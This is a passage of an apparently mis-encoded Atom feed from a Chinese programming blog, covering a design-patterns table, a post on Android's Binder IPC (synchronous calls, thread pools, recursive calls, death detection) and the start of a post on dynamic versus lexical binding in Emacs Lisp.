&lt;p>è®¾è®¡æ¨¡å¼ï¼š&lt;a href="https://mincodes.com/posts/design-patterns-structural/#é€‚é…å™¨--adapter">Adapter é€‚é…å™¨&lt;/a>ï¼Œ&lt;a href="https://mincodes.com/posts/design-patterns-structural/#è£…é¥°å™¨--decorator">Decorator è£…é¥°å™¨&lt;/a>ï¼Œ&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#è®¿é—®è€…--visitor">Visitor è®¿é—®è€…&lt;/a>ã€‚&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="è®¾è®¡æ¨¡å¼æ‰€æ”¯æŒçš„è®¾è®¡çš„å¯å˜æ–¹é¢">è®¾è®¡æ¨¡å¼æ‰€æ”¯æŒçš„è®¾è®¡çš„å¯å˜æ–¹é¢&lt;/h3>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>ç›®çš„&lt;/th>
&lt;th>è®¾è®¡æ¨¡å¼&lt;/th>
&lt;th>å¯å˜çš„æ–¹é¢&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>åˆ›å»º&lt;/td>
&lt;td>&lt;a href="https://mincodes.com/posts/design-patterns-creational/#æŠ½è±¡å·¥å‚--abstract-factory">æŠ½è±¡å·¥å‚ (Abstract Factory)&lt;/a>&lt;/td>
&lt;td>äº§å“å¯¹è±¡å®¶æ—&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;a href="https://mincodes.com/posts/design-patterns-creational/#ç”Ÿæˆå™¨--builder">ç”Ÿæˆå™¨ (Builder)&lt;/a>&lt;/td>
&lt;td>å¦‚ä½•åˆ›å»ºä¸€ä¸ªç»„åˆå¯¹è±¡&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;a href="https://mincodes.com/posts/design-patterns-creational/#å·¥å‚æ–¹æ³•--factory-method">å·¥å‚æ–¹æ³• (Factory Method)&lt;/a>&lt;/td>
&lt;td>è¢«å®ä¾‹åŒ–çš„å­ç±»&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;a href="https://mincodes.com/posts/design-patterns-creational/#åŸå‹--prototype">åŸå‹ (Prototype)&lt;/a>&lt;/td>
&lt;td>è¢«å®ä¾‹åŒ–çš„ç±»&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;a href="https://mincodes.com/posts/design-patterns-creational/#å•ä¾‹--singleton">å•ä¾‹ (Singleton)&lt;/a>&lt;/td>
&lt;td>ä¸€ä¸ªç±»çš„å”¯ä¸€å®ä¾‹&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ç»“æ„&lt;/td>
&lt;td>&lt;a href="https://mincodes.com/posts/design-patterns-structural/#é€‚é…å™¨--adapter">é€‚é…å™¨ (Adapter)&lt;/a>&lt;/td>
&lt;td>å¯¹è±¡çš„æ¥å£&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;a href="https://mincodes.com/posts/design-patterns-structural/#æ¡¥æ¥--bridge">æ¡¥æ¥ (Bridge)&lt;/a>&lt;/td>
&lt;td>å¯¹è±¡çš„å®ç°&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;a href="https://mincodes.com/posts/design-patterns-structural/#ç»„åˆ--composite">ç»„åˆ (Composite)&lt;/a>&lt;/td>
&lt;td>ä¸€ä¸ªå¯¹è±¡çš„ç»“æ„å’Œç»„æˆ&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;a href="https://mincodes.com/posts/design-patterns-structural/#è£…é¥°å™¨--decorator">è£…é¥°å™¨ (Decorator)&lt;/a>&lt;/td>
&lt;td>å¯¹è±¡çš„èŒè´£,ä¸ç”Ÿæˆå­ç±»&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;a href="https://mincodes.com/posts/design-patterns-structural/#å¤–è§‚--facade">å¤–è§‚ (Facade)&lt;/a>&lt;/td>
&lt;td>ä¸€ä¸ªå­ç³»ç»Ÿçš„æ¥å£&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;a href="https://mincodes.com/posts/design-patterns-structural/#äº«å…ƒ--flyweight">äº«å…ƒ (Flyweight)&lt;/a>&lt;/td>
&lt;td>å¯¹è±¡çš„å­˜å‚¨å¼€é”€&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;a href="https://mincodes.com/posts/design-patterns-structural/#ä»£ç†--proxy">ä»£ç† (Proxy)&lt;/a>&lt;/td>
&lt;td>å¦‚ä½•è®¿é—®ä¸€ä¸ªå¯¹è±¡&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>è¡Œä¸º&lt;/td>
&lt;td>&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#è´£ä»»é“¾--chain-of-responsibility">è´£ä»»é“¾ (Chain of Responsibility)&lt;/a>&lt;/td>
&lt;td>å“åº”è¯·æ±‚çš„å¯¹è±¡&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#å‘½ä»¤--command">å‘½ä»¤ (Command)&lt;/a>&lt;/td>
&lt;td>ä½•æ—¶ã€æ€æ ·æ»¡è¶³ä¸€ä¸ªè¯·æ±‚&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#è§£é‡Šå™¨--interpreter">è§£é‡Šå™¨ (Interpreter)&lt;/a>&lt;/td>
&lt;td>ä¸€ä¸ªè¯­è¨€çš„æ–‡æ³•åŠè§£é‡Š&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#è¿­ä»£å™¨--iterator">è¿­ä»£å™¨ (Iterator)&lt;/a>&lt;/td>
&lt;td>å¦‚ä½•éå†ã€è®¿é—®ä¸€ä¸ªé›†åˆçš„å„å…ƒç´ &lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#ä¸­ä»‹è€…--mediator">ä¸­ä»‹è€… (Mediator)&lt;/a>&lt;/td>
&lt;td>å¯¹è±¡é—´æ€æ ·äº¤äº’ã€å’Œè°äº¤äº’&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#å¤‡å¿˜å½•--memento">å¤‡å¿˜å½• (Memento)&lt;/a>&lt;/td>
&lt;td>ä¸€ä¸ªå¯¹è±¡ä¸­å“ªäº›ç§æœ‰ä¿¡æ¯å­˜æ”¾åœ¨è¯¥å¯¹è±¡ä¹‹å¤–,ä»¥åŠä½•æ—¶è¿›è¡Œå­˜å‚¨&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#è§‚å¯Ÿè€…--observer">è§‚å¯Ÿè€… (Observer)&lt;/a>&lt;/td>
&lt;td>å¤šä¸ªå¯¹è±¡ä¾èµ–äºå¦ä¸€ä¸ªå¯¹è±¡,è€Œè¿™äº›å¯¹è±¡åˆå¦‚ä½•ä¿æŒä¸€è‡´&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#çŠ¶æ€--state">çŠ¶æ€ (State)&lt;/a>&lt;/td>
&lt;td>å¯¹è±¡çš„çŠ¶æ€&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#ç­–ç•¥--strategy">ç­–ç•¥ (Strategy)&lt;/a>&lt;/td>
&lt;td>ç®—æ³•&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#æ¨¡æ¿æ–¹æ³•--template-method">æ¨¡æ¿æ–¹æ³• (Template Method)&lt;/a>&lt;/td>
&lt;td>ç®—æ³•ä¸­çš„æŸäº›æ­¥éª¤&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#è®¿é—®è€…--visitor">è®¿é—®è€… (Visitor)&lt;/a>&lt;/td>
&lt;td>æŸäº›å¯ä½œç”¨äºä¸€ç»„å¯¹è±¡ä¸Šçš„æ“ä½œï¼Œä¸”æ— éœ€ä¿®æ”¹è¿™äº›å¯¹è±¡çš„ç±»&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table></content><category scheme="https://mincodes.com/tags/architecture/" term="Architecture" label="Architecture"/><category scheme="https://mincodes.com/tags/design-pattern/" term="Design-Pattern" label="Design-Pattern"/><category scheme="https://mincodes.com/tags/android/" term="Android" label="Android"/></entry><entry><title type="text">Android çš„ Binder æœºåˆ¶</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/android-binder/"/><id>https://mincodes.com/posts/android-binder/</id><updated>2023-07-11T14:02:01+08:00</updated><published>2023-07-01T23:41:00+08:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">åŒæ­¥è°ƒç”¨ IBinder æ¥å£ç›¸å…³çš„å…³é”® API ä¸»è¦æœ‰ä¸¤ä¸ªï¼š IBinder.transact() ç”¨æ¥å‘ä¸€ä¸ª IBinder å¯¹è±¡å‘èµ·è°ƒç”¨è¯·æ±‚ã€‚ Binder.onTransact() ç”¨äºå¤„ç† Binder å¯¹è±¡æ”¶åˆ°çš„è°ƒç”¨ã€‚ è¯·â€¦</summary><content type="html">&lt;h2 id="åŒæ­¥è°ƒç”¨">åŒæ­¥è°ƒç”¨&lt;/h2>
&lt;p>&lt;code>IBinder&lt;/code> æ¥å£ç›¸å…³çš„å…³é”® API ä¸»è¦æœ‰ä¸¤ä¸ªï¼š&lt;/p>
&lt;dl>
&lt;dt>&lt;strong>&lt;code>IBinder.transact()&lt;/code>&lt;/strong>&lt;/dt>
&lt;dd>ç”¨æ¥å‘ä¸€ä¸ª &lt;code>IBinder&lt;/code> å¯¹è±¡å‘èµ·è°ƒç”¨è¯·æ±‚ã€‚&lt;/dd>
&lt;dt>&lt;strong>&lt;code>Binder.onTransact()&lt;/code>&lt;/strong>&lt;/dt>
&lt;dd>ç”¨äºå¤„ç† &lt;code>Binder&lt;/code> å¯¹è±¡æ”¶åˆ°çš„è°ƒç”¨ã€‚&lt;/dd>
&lt;/dl>
&lt;p>è¯·æ³¨æ„ï¼Œè¿™å¥— transaction API æ˜¯ä¸€å¥— &lt;strong>åŒæ­¥&lt;/strong> API, å³ä¸€ä¸ª &lt;code>transact()&lt;/code> è°ƒç”¨ä¼šä¸€ç›´é˜»å¡ï¼Œç›´åˆ°å¯¹é¢çš„ &lt;code>Binder.onTransact()&lt;/code> æ–¹æ³•è¿”å›ä¹‹åï¼Œ &lt;code>transact()&lt;/code> è°ƒç”¨æ‰ä¼šè¿”å›ã€‚&lt;/p>
&lt;p>ä¹‹æ‰€ä»¥è¿™ä¹ˆè®¾è®¡ï¼Œæ˜¯å› ä¸º &lt;code>IBinder&lt;/code> åŒæ—¶æ”¯æŒä¸¤ç§è°ƒç”¨æ–¹å¼ï¼š&lt;/p>
&lt;dl>
&lt;dt>&lt;strong>æœ¬åœ°è¿›ç¨‹è°ƒç”¨&lt;/strong>&lt;/dt>
&lt;dd>å’Œè°ƒç”¨æœ¬åœ°æ–¹æ³•ç±»ä¼¼ï¼Œç”¨æˆ·æœŸå¾…çš„è¡Œä¸ºå°±æ˜¯åŒæ­¥è°ƒç”¨ã€‚&lt;/dd>
&lt;dt>&lt;strong>è¿œç¨‹ IPC è°ƒç”¨&lt;/strong>&lt;/dt>
&lt;dd>è·¨è¿›ç¨‹æƒ…å†µä¸‹ï¼ŒAndroid åº•å±‚ IPC æœºåˆ¶ä¿è¯å’Œæœ¬åœ°è°ƒç”¨æœ‰åŒæ ·çš„è¯­æ„ã€‚&lt;/dd>
&lt;/dl>
&lt;p>æœ¬åœ°è¿›ç¨‹è°ƒç”¨çš„æƒ…å†µä¸‹ï¼Œç”¨æˆ·æœŸå¾…çš„è¡Œä¸ºå°±æ˜¯åŒæ­¥è°ƒç”¨ã€‚å› æ­¤ï¼ŒIPC ä¹Ÿé‡‡ç”¨åŒæ ·çš„ç­–ç•¥ï¼Œè¿™æ ·å¯ä»¥ä¿è¯åœ¨ä¸šåŠ¡è¿›è¡Œé‡æ„ï¼ˆä¾‹å¦‚æ‹†åˆ†å¤šè¿›ç¨‹ï¼‰æ—¶ä¸å—å½±å“ã€‚&lt;/p>
&lt;h2 id="çº¿ç¨‹æ± æœºåˆ¶">çº¿ç¨‹æ± æœºåˆ¶&lt;/h2>
&lt;p>ç³»ç»Ÿåœ¨æ¯ä¸ªè¿›ç¨‹ä¸­éƒ½ç»´æŠ¤äº†ä¸€ä¸ªâ€œäº‹åŠ¡çº¿ç¨‹æ± â€ (a pool of transaction threads), è¿™äº›çº¿ç¨‹ç”¨äºåˆ†å‘æ‰€æœ‰çš„æ¥è‡ªå…¶ä»–è¿›ç¨‹çš„ IPC è°ƒç”¨ã€‚&lt;/p>
&lt;p>æ­£å› å¦‚æ­¤ï¼Œâ€‹&lt;strong>AIDL æ¥å£çš„å®ç°å¿…é¡»æ˜¯çº¿ç¨‹å®‰å…¨çš„&lt;/strong>â€‹ã€‚ç±»ä¼¼åœ°ï¼Œâ€‹&lt;code>ContentProvider&lt;/code> æ–¹æ³•ï¼ˆquery()ã€
insert()ã€delete()ã€update() å’Œ getType() æ–¹æ³•ï¼‰ä¹Ÿå¿…é¡»å®ç°ä¸ºçº¿ç¨‹å®‰å…¨çš„æ–¹æ³•ã€‚&lt;/p>
&lt;p>å‚è€ƒç¤ºæ„å›¾å¦‚ä¸‹ï¼š&lt;/p>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/android-binder-thread-pool.svg">
&lt;/figure>
&lt;p>è°ƒç”¨æ—¶åºå›¾ï¼š&lt;/p>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/android-binder-transact-sequence.svg">
&lt;/figure>
&lt;p>&lt;a href="https://mincodes.com/posts/android-binder/#%E5%90%8C%E6%AD%A5%E8%B0%83%E7%94%A8">å¦‚å‰æ‰€è¿°&lt;/a>ï¼Œå¯¹äº process A æ¥è¯´ï¼Œæ•´ä¸ªè°ƒç”¨æ˜¯ä¸€ä¸ªåŒæ­¥ç­‰å¾…çš„è¿‡ç¨‹ã€‚&lt;/p>
&lt;h2 id="è¿›ç¨‹é—´é€’å½’è°ƒç”¨">è¿›ç¨‹é—´é€’å½’è°ƒç”¨&lt;/h2>
&lt;p>&lt;em>Binder&lt;/em> ç³»ç»Ÿè¿˜æ”¯æŒè¿›ç¨‹ä¹‹é—´çš„é€’å½’è°ƒç”¨ã€‚ä¾‹å¦‚ï¼š&lt;/p>
&lt;ol>
&lt;li>å‡è®¾ process A åœ¨ä¸»çº¿ç¨‹å‘ process B å‘èµ·ä¸€ä¸ª &lt;code>transact()&lt;/code> è¯·æ±‚ï¼Œæˆ‘ä»¬ç§°ä¸º
&lt;em>transact 1&lt;/em> å§ï¼›&lt;/li>
&lt;li>process B åœ¨è‡ªå·±çš„çº¿ç¨‹æ± ä¸­å¤„ç† binder è¯·æ±‚æ—¶ï¼ˆå³ &lt;code>onTransact()&lt;/code> æ–¹æ³•ï¼‰ï¼Œåˆå‘
process A å‘èµ·äº†ä¸€ä¸ª &lt;code>transact()&lt;/code> è¯·æ±‚ï¼Œæˆ‘ä»¬ç§°ä¸º &lt;em>transact 2&lt;/em> ï¼›&lt;/li>
&lt;li>æ­¤æ—¶ process A çš„ä¸»çº¿ç¨‹è¿˜åœ¨ç­‰å¾…è‡ªå·±å‘å‡ºçš„ &lt;code>transact()&lt;/code> çš„å“åº”ï¼Œä»å¤„äºé˜»å¡çŠ¶æ€ï¼ˆå‚è€ƒ&lt;a href="https://mincodes.com/posts/android-binder/#%E5%90%8C%E6%AD%A5%E8%B0%83%E7%94%A8">åŒæ­¥è°ƒç”¨&lt;/a>ï¼‰ã€‚ä¸è¿‡ç”±äº Android ä¼šè‡ªåŠ¨åœ¨ process A ä¸­ç»´æŠ¤ä¸€ä¸ªçº¿ç¨‹æ± ï¼Œç”¨äºè¿™ç±»å¤„ç† IPC è¯·æ±‚ï¼Œå› æ­¤ &lt;em>transact 2&lt;/em> å¯ä»¥å¾—åˆ°æ­£å¸¸å¤„ç†ï¼Œå¤„ç†å®Œä¹‹åï¼Œæ­£å¸¸è¿”å›åˆ°è¿›ç¨‹ B ä¸­ï¼›&lt;/li>
&lt;li>è¿”å›è¿›ç¨‹ B åï¼Œç»§ç»­å¤„ç† &lt;em>transact 1&lt;/em>, ç„¶åè¿”å› process A, ç»“æŸ &lt;em>transact 1&lt;/em> çš„è°ƒç”¨ã€‚&lt;/li>
&lt;/ol>
&lt;p>è¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœç³»ç»Ÿä¸ç»´æŠ¤ä¸€ä¸ªçº¿ç¨‹æ± æ¥å¤„ç†è¿™ç±» IPC è¯·æ±‚ï¼Œé‚£åœ¨ process B é€’å½’çš„å‘
process A å‘èµ· IPC è¯·æ±‚æ—¶ï¼Œè¿™ä¸¤ä¸ªè¿›ç¨‹å¯èƒ½å°±è¢«å¡æ­»äº†ã€‚&lt;/p>
&lt;p>ä¸Šè¿°è¿‡ç¨‹æ˜¯ä¸æ˜¯æœ‰ç‚¹åƒåœ¨æ¨¡æ‹Ÿä¸€ä¸ªæœ¬åœ°çš„é€’å½’è°ƒç”¨ï¼Ÿäº‹å®ä¸Šï¼Œå’Œ&lt;a href="https://mincodes.com/posts/android-binder/#%E5%90%8C%E6%AD%A5%E8%B0%83%E7%94%A8">åŒæ­¥è°ƒç”¨&lt;/a>ç±»ä¼¼ï¼Œä¹‹æ‰€ä»¥è¿™ä¹ˆè®¾è®¡ï¼Œä¹Ÿæ˜¯ä¸ºäº†å°½é‡è®©ä¸Šå±‚åº”ç”¨å¯¹â€œIPC è°ƒç”¨â€è¿™ä»¶äº‹æƒ…ä¿æŒé€æ˜ï¼Œåº•å±‚å¯ä»¥ä»»æ„åˆ‡æ¢ç»„ä»¶çš„ç‰©ç†å¸ƒå±€ï¼Œè€Œä¸å½±å“ä¸Šå±‚çš„ä¸šåŠ¡è°ƒç”¨ã€‚&lt;/p>
&lt;p>ä¸Šè¿°è¿‡ç¨‹å¯ä»¥å‚è€ƒå¦‚ä¸‹æ—¶åºå›¾ï¼š&lt;/p>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/android-binder-recursion.svg">
&lt;/figure>
&lt;h2 id="è¿œç¨‹å¯¹è±¡ç”Ÿå‘½å‘¨æœŸæ£€æµ‹">è¿œç¨‹å¯¹è±¡ç”Ÿå‘½å‘¨æœŸæ£€æµ‹&lt;/h2>
&lt;p>å’Œ &lt;code>IBinder&lt;/code> è¿™ç±»è¿œç¨‹å¯¹è±¡ååŒå·¥ä½œæ—¶ï¼Œå¾ˆé‡è¦çš„ä¸€ç‚¹æ˜¯å¯¹å…¶ç”Ÿå‘½å‘¨æœŸçš„æ„ŸçŸ¥ã€‚ä¸€æ—¦è¿œç¨‹å¯¹è±¡æ‰€åœ¨çš„è¿›ç¨‹è¢«é”€æ¯äº†ï¼Œè¯¥è¿œç¨‹å¯¹è±¡ä¹Ÿä¼šæˆä¸ºä¸€ä¸ªæ— æ•ˆå¯¹è±¡ã€‚&lt;/p>
&lt;p>ç³»ç»Ÿæä¾›äº†å¦‚ä¸‹å‡ ç§æ–¹å¼ç”¨äº &lt;code>IBinder&lt;/code> å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸæ£€æµ‹ï¼š&lt;/p>
&lt;dl>
&lt;dt>&lt;strong>&lt;code>RemoteException&lt;/code>&lt;/strong>&lt;/dt>
&lt;dd>å½“ &lt;code>IBinder&lt;/code> å¯¹è±¡æ‰€åœ¨çš„è¿›ç¨‹å·²ç»è¢«é”€æ¯æ—¶ï¼Œè°ƒç”¨
&lt;code>IBinder.transact()&lt;/code> æ–¹æ³•ä¼šæŠ›å‡ºè¯¥å¼‚å¸¸ã€‚&lt;/dd>
&lt;dt>&lt;strong>&lt;code>IBinder.pingBinder()&lt;/code>&lt;/strong>&lt;/dt>
&lt;dd>è¯¥æ–¹æ³•è¿”å› &lt;code>false&lt;/code> è¡¨ç¤ºå…¶æ‰€åœ¨è¿›ç¨‹å·²é”€æ¯ã€‚&lt;/dd>
&lt;dt>&lt;strong>&lt;code>IBinder.linkToDeath()&lt;/code>&lt;/strong>&lt;/dt>
&lt;dd>å¯ç”¨äºæ³¨å†Œä¸€ä¸ª &lt;code>DeathRecipient&lt;/code> å¯¹è±¡ï¼Œç”¨æ¥æ¥æ”¶è¿›ç¨‹é”€æ¯æ—¶çš„å›è°ƒã€‚&lt;/dd>
&lt;/dl>
&lt;h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™&lt;/h2>
&lt;ul>
&lt;li>&lt;em>IBinder.java&lt;/em> æºç &lt;/li>
&lt;li>&lt;em>Binder.java&lt;/em> æºç &lt;/li>
&lt;/ul></content><category scheme="https://mincodes.com/tags/android/" term="Android" label="Android"/></entry><entry><title type="text">åŠ¨æ€ç»‘å®šï¼ˆDynamic Bindingï¼‰å’Œè¯æ³•ç»‘å®šï¼ˆLexical Bindingï¼‰</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/dynamic-lexical-binding-in-elisp/"/><id>https://mincodes.com/posts/dynamic-lexical-binding-in-elisp/</id><updated>2023-06-26T15:24:47+08:00</updated><published>2023-06-26T14:42:00+08:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">ä»Šå¤©è¯»äº†ä¸€ç¯‡è®² dynamic binding å’Œ lexical binding çš„æ–‡ç« ï¼š Dynamic Binding Vs Lexical Bindingï¼Œè®²çš„æŒºæ¸…æ¥šçš„ï¼Œè¿™é‡Œå¤§è‡´ç¿»è¯‘å¦‚ä¸‹ã€‚ ç»‘å®š binding çš„æ¦‚å¿µâ€¦</summary><content type="html">&lt;p>ä»Šå¤©è¯»äº†ä¸€ç¯‡è®² dynamic binding å’Œ lexical binding çš„æ–‡ç« ï¼š &lt;a href="https://www.emacswiki.org/emacs/DynamicBindingVsLexicalBinding">Dynamic Binding Vs
Lexical Binding&lt;/a>ï¼Œè®²çš„æŒºæ¸…æ¥šçš„ï¼Œè¿™é‡Œå¤§è‡´ç¿»è¯‘å¦‚ä¸‹ã€‚&lt;/p>
&lt;h2 id="ç»‘å®š-binding-çš„æ¦‚å¿µ">ç»‘å®š binding çš„æ¦‚å¿µ&lt;/h2>
&lt;p>ç»‘å®šæ˜¯åå­—å’Œå€¼çš„ä¸€ç§å¯¹åº”å…³ç³»ã€‚åœ¨ Lisp ä¸­ï¼Œå¯ä»¥ç”¨ &lt;code>let&lt;/code> æ¥åˆ›å»ºç»‘å®šï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-emacs-lisp" data-lang="emacs-lisp">&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">let&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">a&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">print&lt;/span> &lt;span class="nv">a&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">;; ==&amp;gt; 1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>è¿™é‡Œå°† name &lt;code>a&lt;/code> ç»‘å®šåˆ° value &lt;code>1&lt;/code> ä¸Šã€‚&lt;/p>
&lt;p>&lt;code>let&lt;/code> è¡¨è¾¾å¼å…¶å®åªæ˜¯ä¸€ä¸ªâ€œè¯­æ³•ç³–â€ï¼Œå’Œ &lt;code>lambda&lt;/code> è¡¨è¾¾å¼æ˜¯ç­‰ä»·çš„ã€‚ä¾‹å¦‚ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-emacs-lisp" data-lang="emacs-lisp">&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nb">let&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">a&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nv">b&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nf">+&lt;/span> &lt;span class="nv">a&lt;/span> &lt;span class="nv">b&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ç­‰ä»·äºï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-emacs-lisp" data-lang="emacs-lisp">&lt;span class="line">&lt;span class="cl"> &lt;span class="p">((&lt;/span>&lt;span class="nb">lambda&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">a&lt;/span> &lt;span class="nv">b&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">+&lt;/span> &lt;span class="nv">a&lt;/span> &lt;span class="nv">b&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å½“ç„¶ï¼Œé™¤äº† &lt;code>let&lt;/code> ä¹‹å¤–ï¼Œè¿˜æœ‰å¾ˆå¤šå…¶ä»–çš„æ–¹æ³•å¯ä»¥åˆ›å»º bindings, ä¾‹å¦‚ &lt;code>defconst&lt;/code>, &lt;code>defun&lt;/code>,
&lt;code>defvar&lt;/code>, &lt;code>flet&lt;/code>, &lt;code>labels&lt;/code>, &lt;code>prog&lt;/code>, ç­‰ç­‰ã€‚&lt;/p>
&lt;h2 id="åŠ¨æ€ç»‘å®šå’Œè¯æ³•ç»‘å®š">åŠ¨æ€ç»‘å®šå’Œè¯æ³•ç»‘å®š&lt;/h2>
&lt;p>åœ¨å¤„ç†å˜é‡ç»‘å®šæ—¶ï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼š&lt;/p>
&lt;dl>
&lt;dt>dynamic&lt;/dt>
&lt;dd>åŠ¨æ€ç»‘å®šï¼Œæ‰€æœ‰çš„å˜é‡ååŠå®ƒä»¬çš„å€¼éƒ½å­˜åœ¨ä¸€å¼ å…¨å±€è¡¨ä¸­ã€‚&lt;/dd>
&lt;dt>lexical&lt;/dt>
&lt;dd>è¯æ³•ç»‘å®šï¼Œæ¯ä¸ªç»‘å®šä½œç”¨åŸŸï¼ˆbinding scopeï¼‰ï¼ŒåŒ…æ‹¬ defun/let ç­‰ï¼Œéƒ½ä¼šåˆ›å»ºä¸€å¼ æ–°çš„è¡¨ï¼Œç”¨äºå­˜æ”¾å˜é‡å’Œå€¼ï¼Œè¿™äº›è¡¨ç»„ç»‡æˆä¸€ä¸ªå±‚æ¬¡ç»“æ„ï¼Œè¢«ç§°ä¸º &amp;ldquo;the enviroment&amp;rdquo;ã€‚&lt;/dd>
&lt;/dl>
&lt;p>åœ¨ä¸Šé¢ç»™å‡ºçš„é‚£äº›ç®€å•çš„ä¾‹å­ä¸­ï¼Œlexical å’Œ dynamic binding ä¹‹é—´å¹¶æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œè¿”å›çš„ç»“æœæ˜¯ä¸€æ ·çš„ã€‚&lt;/p>
